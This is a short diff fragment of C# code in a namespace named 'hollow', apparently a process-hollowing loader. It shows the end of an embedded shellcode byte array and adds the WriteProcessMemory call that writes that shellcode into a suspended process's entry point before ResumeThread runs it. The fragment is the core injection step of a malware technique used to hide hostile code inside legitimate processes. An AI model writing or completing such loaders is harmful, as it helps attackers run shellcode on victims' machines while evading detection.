@@ -191,6 +191,8 @@ namespace hollow
             0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,
             0xd5};
 
+            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
             ResumeThread(pi.hThread);
         }
     }
